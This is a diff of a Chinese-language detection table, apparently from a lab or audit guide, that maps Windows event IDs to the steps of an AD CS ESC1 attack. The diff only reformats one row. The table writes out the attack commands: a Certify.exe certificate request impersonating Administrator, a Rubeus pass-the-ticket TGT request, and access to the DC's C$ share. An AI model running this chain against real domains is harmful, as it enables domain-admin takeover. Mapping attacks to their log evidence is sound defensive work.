@@ -151,7 +151,10 @@ auditpol /set /subcategory:"File Share" /success:enable /failure:enable
 | `Certify.exe enum-templates /ca:10.0.0.206\sme-SME-SWP-W-AD-CA /vulnerable` | 通常無 4886/4887 | CA | N/A |
 | | 可能 4769 (Kerberos Service Ticket) | DC | 取決於工具實作 |
 | | 4688 (Process Creation) | 測試機 | 需啟用 Process Auditing |
-| `Certify.exe request /ca:10.0.0.206\sme-SME-SWP-W-AD-CA /template:ESC1 /upn:Administrator@sme.local` | **4886** (憑證申請) | CA | RequestId, Requester, Template |
+| `.\Certify.exe request `
+  --ca "10.0.0.206\sme-SME-SWP-W-AD-CA" `
+  --template "ESC1" `
+  --upn "Administrator@sme.local"` | **4886** (憑證申請) | CA | RequestId, Requester, Template |
 | | **4887** (憑證簽發) | CA | RequestId, Requester, Subject |
 | `Rubeus.exe asktgt /user:Administrator /certificate:[...] /ptt` | **4768** (Kerberos TGT Request - PKINIT) | DC | Certificate Information, TargetUserName |
 | `dir \\10.0.0.206\c$` (或其他存取) | **4624** (成功登入) | DC | Logon Type 3/9, TargetUserName |
